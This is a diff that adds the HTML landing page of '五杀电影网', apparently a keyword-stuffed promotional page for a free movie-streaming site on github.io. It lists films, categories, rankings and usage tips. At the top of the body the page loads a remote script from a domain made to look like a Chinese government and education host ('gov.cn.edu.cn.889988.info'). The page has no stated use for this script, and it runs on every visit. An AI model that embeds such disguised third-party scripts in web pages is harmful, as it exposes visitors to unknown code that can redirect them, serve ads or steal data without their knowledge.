@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>五杀电影网 - 免费高清电影在线观看 | wushadianyingwang-app.github.io</title>
+<meta name="description" content="五杀电影网(wushadianyingwang-app.github.io)提供最新高清电影、电视剧、动漫、综艺在线观看，每日更新，免费播放，畅享极致观影体验。">
+<meta name="keywords" content="五杀电影网,免费电影,在线观看,高清影视,wushadianyingwang-app">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<style>
+/* ===== 全局重置 ===== */
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;font-size:16px;}
+
+/* ===== 变量定义 ===== */
+:root{
+  --neon-pink:#ff2d95;
+  --neon-purple:#a855f7;
+  --neon-cyan:#22d3ee;
+  --dark-bg:#0a0a0f;
+  --card-bg:#12121f;
+  --text-primary:#e8e8ff;
+  --text-secondary:#a0a0c0;
+}
+
+/* ===== Body ===== */
+body{
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  background:var(--dark-bg);
+  color:var(--text-primary);
+  line-height:1.7;
+  overflow-x:hidden;
+}
+
+/* ===== 粒子背景层 ===== */
+#particles{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse at 20% 50%,rgba(168,85,247,0.08),transparent 60%),
+              radial-gradient(ellipse at 80% 20%,rgba(34,211,238,0.06),transparent 60%);
+}
+
+/* ===== 导航栏 ===== */
+.navbar{
+  position:fixed;top:0;width:100%;z-index:1000;
+  background:rgba(10,10,15,0.92);backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(255,45,149,0.15);
+  transition:all 0.3s ease;
+}
+.nav-container{
+  max-width:1200px;margin:0 auto;padding:0 20px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:64px;
+}
+.nav-logo{
+  font-size:1.5rem;font-weight:800;
+  background:linear-gradient(135deg,var(--neon-pink),var(--neon-purple),var(--neon-cyan));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  text-decoration:none;letter-spacing:1px;
+}
+.nav-menu{display:flex;gap:28px;list-style:none;}
+.nav-menu a{
+  color:var(--text-secondary);text-decoration:none;font-size:0.9rem;
+  transition:color 0.3s;position:relative;padding:4px 0;
+}
+.nav-menu a:hover{color:var(--neon-pink);}
+.nav-menu a::after{
+  content:'';position:absolute;bottom:-2px;left:0;width:0;height:2px;
+  background:linear-gradient(90deg,var(--neon-pink),var(--neon-purple));
+  transition:width 0.3s;
+}
+.nav-menu a:hover::after{width:100%;}
+.mobile-toggle{display:none;color:#fff;font-size:1.6rem;cursor:pointer;}
+
+/* ===== Hero 区域 ===== */
+.hero{
+  position:relative;z-index:1;
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  text-align:center;padding:100px 20px 60px;
+}
+.hero-content{max-width:800px;}
+.hero-badge{
+  display:inline-block;padding:6px 20px;border-radius:30px;
+  background:rgba(255,45,149,0.1);border:1px solid rgba(255,45,149,0.3);
+  color:var(--neon-pink);font-size:0.8rem;margin-bottom:24px;
+  animation:pulse 2.5s infinite;
+}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.6;}}
+.hero h1{
+  font-size:clamp(2rem,5vw,3.8rem);font-weight:900;line-height:1.2;margin-bottom:20px;
+}
+.hero h1 .gradient-text{
+  background:linear-gradient(135deg,var(--neon-pink),var(--neon-purple),var(--neon-cyan));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+}
+.hero-sub{
+  font-size:1.1rem;color:var(--text-secondary);margin-bottom:36px;
+  max-width:600px;margin-left:auto;margin-right:auto;
+}
+.hero-btn{
+  display:inline-block;padding:16px 44px;border-radius:50px;
+  background:linear-gradient(135deg,var(--neon-pink),var(--neon-purple));
+  color:#fff;text-decoration:none;font-weight:700;font-size:1rem;
+  box-shadow:0 0 30px rgba(255,45,149,0.4);transition:all 0.3s;
+}
+.hero-btn:hover{transform:translateY(-3px);box-shadow:0 0 50px rgba(255,45,149,0.6);}
+
+/* ===== 通用区块 ===== */
+.section{padding:80px 20px;position:relative;z-index:1;}
+.section-container{max-width:1200px;margin:0 auto;}
+.section-header{text-align:center;margin-bottom:50px;}
+.section-header h2{
+  font-size:clamp(1.6rem,3.5vw,2.4rem);font-weight:800;margin-bottom:12px;
+}
+.section-header p{color:var(--text-secondary);font-size:0.95rem;}
+
+/* ===== 栏目1：热门推荐 ===== */
+.grid-4{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;}
+.movie-card{
+  background:var(--card-bg);border-radius:16px;overflow:hidden;
+  border:1px solid rgba(255,255,255,0.05);transition:all 0.3s;
+  cursor:pointer;
+}
+.movie-card:hover{transform:translateY(-8px);border-color:rgba(255,45,149,0.3);box-shadow:0 12px 40px rgba(168,85,247,0.15);}
+.movie-poster{
+  width:100%;height:240px;background:linear-gradient(135deg,#1a1a2e,#16213e);
+  display:flex;align-items:center;justify-content:center;font-size:3rem;
+}
+.movie-info{padding:16px;}
+.movie-info h3{font-size:0.95rem;margin-bottom:6px;}
+.movie-info p{font-size:0.8rem;color:var(--text-secondary);}
+.movie-tag{
+  display:inline-block;padding:2px 10px;border-radius:12px;font-size:0.7rem;
+  background:rgba(34,211,238,0.1);color:var(--neon-cyan);margin-top:8px;
+}
+
+/* ===== 栏目2：电影分类 ===== */
+.cat-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:20px;}
+.cat-item{
+  background:var(--card-bg);border-radius:16px;padding:32px 24px;text-align:center;
+  border:1px solid rgba(255,255,255,0.05);transition:all 0.3s;
+}
+.cat-item:hover{border-color:var(--neon-purple);background:rgba(168,85,247,0.05);}
+.cat-icon{font-size:2.5rem;margin-bottom:12px;}
+.cat-item h3{font-size:1rem;margin-bottom:8px;}
+.cat-item p{font-size:0.8rem;color:var(--text-secondary);}
+
+/* ===== 栏目3：最新更新 ===== */
+.update-list{display:flex;flex-direction:column;gap:16px;}
+.update-item{
+  display:flex;align-items:center;gap:20px;
+  background:var(--card-bg);border-radius:12px;padding:16px 20px;
+  border:1px solid rgba(255,255,255,0.05);transition:all 0.3s;
+}
+.update-item:hover{border-color:rgba(34,211,238,0.3);}
+.update-num{
+  width:40px;height:40px;border-radius:50%;
+  background:linear-gradient(135deg,var(--neon-pink),var(--neon-purple));
+  display:flex;align-items:center;justify-content:center;font-weight:700;flex-shrink:0;
+}
+.update-info h3{font-size:0.95rem;margin-bottom:4px;}
+.update-info p{font-size:0.8rem;color:var(--text-secondary);}
+.update-time{margin-left:auto;font-size:0.8rem;color:var(--neon-cyan);white-space:nowrap;}
+
+/* ===== 栏目4：排行榜 ===== */
+.rank-list{display:flex;flex-direction:column;gap:14px;}
+.rank-item{
+  display:flex;align-items:center;gap:16px;
+  background:var(--card-bg);border-radius:12px;padding:14px 20px;
+  border:1px solid rgba(255,255,255,0.05);transition:all 0.3s;
+}
+.rank-item:hover{transform:translateX(6px);border-color:rgba(255,45,149,0.3);}
+.rank-medal{font-size:1.8rem;}
+.rank-info h3{font-size:0.9rem;}
+.rank-info p{font-size:0.75rem;color:var(--text-secondary);}
+.rank-score{margin-left:auto;font-size:1.2rem;font-weight:700;color:var(--neon-pink);}
+
+/* ===== 栏目5：观影指南 ===== */
+.guide-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:24px;}
+.guide-card{
+  background:var(--card-bg);border-radius:16px;padding:32px;
+  border:1px solid rgba(255,255,255,0.05);transition:all 0.3s;
+}
+.guide-card:hover{border-color:var(--neon-cyan);}
+.guide-card h3{font-size:1.1rem;margin-bottom:12px;color:var(--neon-cyan);}
+.guide-card p{font-size:0.9rem;color:var(--text-secondary);line-height:1.8;}
+
+/* ===== 栏目6：关于我们 ===== */
+.about-section{
+  background:var(--card-bg);border-radius:20px;padding:48px;
+  border:1px solid rgba(255,255,255,0.05);text-align:center;
+}
+.about-section h2{font-size:1.8rem;margin-bottom:16px;}
+.about-section p{color:var(--text-secondary);max-width:700px;margin:0 auto 24px;line-height:1.9;}
+.about-url{
+  display:inline-block;padding:12px 28px;border-radius:10px;
+  background:rgba(34,211,238,0.08);border:1px solid rgba(34,211,238,0.2);
+  color:var(--neon-cyan);font-family:monospace;font-size:0.95rem;
+}
+
+/* ===== Footer ===== */
+.footer{
+  position:relative;z-index:1;
+  background:rgba(10,10,15,0.98);border-top:1px solid rgba(255,255,255,0.05);
+  padding:48px 20px 24px;text-align:center;
+}
+.footer-logo{
+  font-size:1.4rem;font-weight:800;
+  background:linear-gradient(135deg,var(--neon-pink),var(--neon-purple));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  margin-bottom:16px;
+}
+.footer-links{display:flex;justify-content:center;gap:28px;flex-wrap:wrap;margin-bottom:24px;}
+.footer-links a{color:var(--text-secondary);text-decoration:none;font-size:0.85rem;transition:color 0.3s;}
+.footer-links a:hover{color:var(--neon-pink);}
+.footer-copy{color:#555;font-size:0.75rem;}
+
+/* ===== 移动端适配 ===== */
+@media(max-width:768px){
+  .nav-menu{
+    display:none;position:absolute;top:64px;left:0;width:100%;
+    background:rgba(10,10,15,0.98);flex-direction:column;padding:20px;
+    border-bottom:1px solid rgba(255,45,149,0.15);
+  }
+  .nav-menu.active{display:flex;}
+  .nav-menu li{padding:12px 0;text-align:center;border-bottom:1px solid rgba(255,255,255,0.05);}
+  .mobile-toggle{display:block;}
+  .grid-4{grid-template-columns:repeat(2,1fr);gap:16px;}
+  .movie-poster{height:180px;font-size:2rem;}
+  .cat-grid{grid-template-columns:1fr;}
+  .guide-grid{grid-template-columns:1fr;}
+  .update-item{flex-direction:column;text-align:center;gap:12px;}
+  .update-time{margin-left:0;}
+  .rank-item{flex-wrap:wrap;}
+  .rank-score{margin-left:0;}
+  .about-section{padding:32px 20px;}
+  .section{padding:60px 16px;}
+}
+@media(max-width:480px){
+  .grid-4{grid-template-columns:1fr 1fr;}
+  .hero h1{font-size:1.8rem;}
+  .hero-sub{font-size:0.9rem;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 粒子背景 -->
+<div id="particles"></div>
+
+<!-- 导航栏 -->
+<nav class="navbar">
+  <div class="nav-container">
+    <a href="#" class="nav-logo">🎬 五杀电影网</a>
+    <ul class="nav-menu" id="navMenu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#hot">热门推荐</a></li>
+      <li><a href="#category">电影分类</a></li>
+      <li><a href="#update">最新更新</a></li>
+      <li><a href="#rank">排行榜</a></li>
+      <li><a href="#guide">观影指南</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+    <div class="mobile-toggle" id="mobileToggle">☰</div>
+  </div>
+</nav>
+
+<!-- Hero 区域 -->
+<section class="hero" id="home">
+  <div class="hero-content">
+    <div class="hero-badge">🔥 每日更新 · 免费观看</div>
+    <h1>欢迎来到 <span class="gradient-text">五杀电影网</span></h1>
+    <p class="hero-sub">五杀电影网(wushadianyingwang-app.github.io)是您的最佳影视伴侣，汇聚海量高清电影、热播剧集、经典动漫与综艺节目，随时随地畅享极致观影体验。</p>
+    <a href="#hot" class="hero-btn">立即探索</a>
+  </div>
+</section>
+
+<!-- 栏目1：热门推荐 -->
+<section class="section" id="hot">
+  <div class="section-container">
+    <div class="section-header">
+      <h2>🔥 热门推荐</h2>
+      <p>五杀电影网精选高分好片，每日更新</p>
+    </div>
+    <div class="grid-4">
+      <div class="movie-card">
+        <div class="movie-poster">🎬</div>
+        <div class="movie-info">
+          <h3>沙丘2</h3>
+          <p>科幻 / 冒险 / 2024</p>
+          <span class="movie-tag">8.3分</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">🎭</div>
+        <div class="movie-info">
+          <h3>奥本海默</h3>
+          <p>传记 / 历史 / 2023</p>
+          <span class="movie-tag">8.8分</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">🦸</div>
+        <div class="movie-info">
+          <h3>蜘蛛侠：纵横宇宙</h3>
+          <p>动画 / 动作 / 2023</p>
+          <span class="movie-tag">8.5分</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster">⚔️</div>
+        <div class="movie-info">
+          <h3>封神第一部</h3>
+          <p>奇幻 / 动作 / 2023</p>
+          <span class="movie-tag">7.9分</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：电影分类 -->
+<section class="section" id="category">
+  <div class="section-container">
+    <div class="section-header">
+      <h2>📂 电影分类</h2>
+      <p>五杀电影网全品类覆盖，想看什么就点什么</p>
+    </div>
+    <div class="cat-grid">
+      <div class="cat-item">
+        <div class="cat-icon">💥</div>
+        <h3>动作片</h3>
+        <p>热血激战，燃爆全场</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">😂</div>
+        <h3>喜剧片</h3>
+        <p>欢乐不断，笑料十足</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">👻</div>
+        <h3>恐怖片</h3>
+        <p>惊悚刺激，心跳加速</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">💕</div>
+        <h3>爱情片</h3>
+        <p>甜蜜虐心，感人至深</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">🚀</div>
+        <h3>科幻片</h3>
+        <p>脑洞大开，视觉震撼</p>
+      </div>
+      <div class="cat-item">
+        <div class="cat-icon">📜</div>
+        <h3>历史片</h3>
+        <p>穿越时空，重温经典</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：最新更新 -->
+<section class="section" id="update">
+  <div class="section-container">
+    <div class="section-header">
+      <h2>🆕 最新更新</h2>
+      <p>五杀电影网实时同步最新影视资源</p>
+    </div>
+    <div class="update-list">
+      <div class="update-item">
+        <div class="update-num">1</div>
+        <div class="update-info">
+          <h3>美国队长4</h3>
+          <p>动作 / 科幻 / 2025</p>
+        </div>
+        <div class="update-time">2小时前</div>
+      </div>
+      <div class="update-item">
+        <div class="update-num">2</div>
+        <div class="update-info">
+          <h3>周处除三害</h3>
+          <p>犯罪 / 动作 / 2024</p>
+        </div>
+        <div class="update-time">5小时前</div>
+      </div>
+      <div class="update-item">
+        <div class="update-num">3</div>
+        <div class="update-info">
+          <h3>飞驰人生2</h3>
+          <p>喜剧 / 运动 / 2024</p>
+        </div>
+        <div class="update-time">昨天</div>
+      </div>
+      <div class="update-item">
+        <div class="update-num">4</div>
+        <div class="update-info">
+          <h3>热辣滚烫</h3>
+          <p>喜剧 / 剧情 / 2024</p>
+        </div>
+        <div class="update-time">昨天</div>
+      </div>
+      <div class="update-item">
+        <div class="update-num">5</div>
+        <div class="update-info">
+          <h3>第二十条</h3>
+          <p>剧情 / 喜剧 / 2024</p>
+        </div>
+        <div class="update-time">3天前</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目4：排行榜 -->
+<section class="section" id="rank">
+  <div class="section-container">
+    <div class="section-header">
+      <h2>🏆 排行榜</h2>
+      <p>五杀电影网用户最爱榜单</p>
+    </div>
+    <div class="rank-list">
+      <div class="rank-item">
+        <span class="rank-medal">🥇</span>
+        <div class="rank-info">
+          <h3>肖申克的救赎</h3>
+          <p>剧情 / 1994</p>
+        </div>
+        <div class="rank-score">9.7</div>
+      </div>
+      <div class="rank-item">
+        <span class="rank-medal">🥈</span>
+        <div class="rank-info">
+          <h3>霸王别姬</h3>
+          <p>剧情 / 1993</p>
+        </div>
+        <div class="rank-score">9.6</div>
+      </div>
+      <div class="rank-item">
+        <span class="rank-medal">🥉</span>
+        <div class="rank-info">
+          <h3>阿甘正传</h3>
+          <p>剧情 / 1994</p>
+        </div>
+        <div class="rank-score">9.5</div>
+      </div>
+      <div class="rank-item">
+        <span class="rank-medal">4️⃣</span>
+        <div class="rank-info">
+          <h3>泰坦尼克号</h3>
+          <p>爱情 / 1997</p>
+        </div>
+        <div class="rank-score">9.4</div>
+      </div>
+      <div class="rank-item">
+        <span class="rank-medal">5️⃣</span>
+        <div class="rank-info">
+          <h3>盗梦空间</h3>
+          <p>科幻 / 2010</p>
+        </div>
+        <div class="rank-score">9.3</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：观影指南 -->
+<section class="section" id="guide">
+  <div class="section-container">
+    <div class="section-header">
+      <h2>📖 观影指南</h2>
+      <p>五杀电影网使用攻略</p>
+    </div>
+    <div class="guide-grid">
+      <div class="guide-card">
+        <h3>🎯 如何搜索影片</h3>
+        <p>在五杀电影网首页使用分类导航快速定位您想看的影片类型，或通过关键字直接查找。我们支持模糊搜索，输入片名关键词即可匹配相关结果。</p>
+      </div>
+      <div class="guide-card">
+        <h3>📱 多端适配体验</h3>
+        <p>五杀电影网采用响应式设计，完美适配手机、平板、电脑等各种设备。无论何时何地，打开 wushadianyingwang-app.github.io 即可畅享观影。</p>
+      </div>
+      <div class="guide-card">
+        <h3>⚡ 播放流畅保障</h3>
+        <p>我们采用多线路智能切换技术，确保每一部影片都能流畅播放。如遇卡顿，可尝试切换不同清晰度或刷新页面重新加载。</p>
+      </div>
+      <div class="guide-card">
+        <h3>🔔 更新提醒</h3>
+        <p>五杀电影网每日定时更新最新院线电影、热播剧集。收藏本站，第一时间获取最新影视资源更新通知，不再错过任何好片。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目6：关于我们 -->
+<section class="section" id="about">
+  <div class="section-container">
+    <div class="about-section">
+      <h2>关于 五杀电影网</h2>
+      <p>
+        五杀电影网(wushadianyingwang-app.github.io)是一个专注于提供高清免费影视在线观看的公益影视导航平台。
+        我们致力于为用户打造简洁、流畅、无广告干扰的观影环境。网站涵盖电影、电视剧、动漫、综艺等全品类影视资源，
+        每日更新最新内容，让您随时随地享受极致观影乐趣。
+      </p>
+      <p style="margin-bottom:24px;color:var(--text-secondary);">
+        无论是最新院线大片还是经典怀旧老片，五杀电影网都能满足您的观影需求。
+      </p>
+      <div class="about-url">🌐 https://wushadianyingwang-app.github.io</div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="footer-logo">🎬 五杀电影网</div>
+  <div class="footer-links">
+    <a href="#home">首页</a>
+    <a href="#hot">热门推荐</a>
+    <a href="#category">电影分类</a>
+    <a href="#update">最新更新</a>
+    <a href="#rank">排行榜</a>
+    <a href="#guide">观影指南</a>
+    <a href="#about">关于我们</a>
+  </div>
+  <p class="footer-copy">© 2024 五杀电影网 wushadianyingwang-app.github.io | 本网站仅供学习交流使用</p>
+</footer>
+
+<script>
+// 移动端菜单切换
+const mobileToggle=document.getElementById('mobileToggle');
+const navMenu=document.getElementById('navMenu');
+mobileToggle.addEventListener('click',()=>{
+  navMenu.classList.toggle('active');
+});
+
+// 平滑滚动
+document.querySelectorAll('a[href^="#"]').forEach(anchor=>{
+  anchor.addEventListener('click',function(e){
+    e.preventDefault();
+    const target=document.querySelector(this.getAttribute('href'));
+    if(target){
+      target.scrollIntoView({behavior:'smooth',block:'start'});
+      navMenu.classList.remove('active');
+    }
+  });
+});
+
+// 导航栏滚动效果
+window.addEventListener('scroll',()=>{
+  const navbar=document.querySelector('.navbar');
+  if(window.scrollY>50){
+    navbar.style.background='rgba(10,10,15,0.98)';
+    navbar.style.boxShadow='0 2px 20px rgba(0,0,0,0.5)';
+  }else{
+    navbar.style.background='rgba(10,10,15,0.92)';
+    navbar.style.boxShadow='none';
+  }
+});
+
+// 卡片入场动画
+const observer=new IntersectionObserver((entries)=>{
+  entries.forEach(entry=>{
+    if(entry.isIntersecting){
+      entry.target.style.opacity='1';
+      entry.target.style.transform='translateY(0)';
+    }
+  });
+},{threshold:0.1});
+
+document.querySelectorAll('.movie-card,.cat-item,.update-item,.rank-item,.guide-card').forEach(el=>{
+  el.style.opacity='0';
+  el.style.transform='translateY(30px)';
+  el.style.transition='all 0.6s ease';
+  observer.observe(el);
+});
+</script>
+
+</body>
+</html>
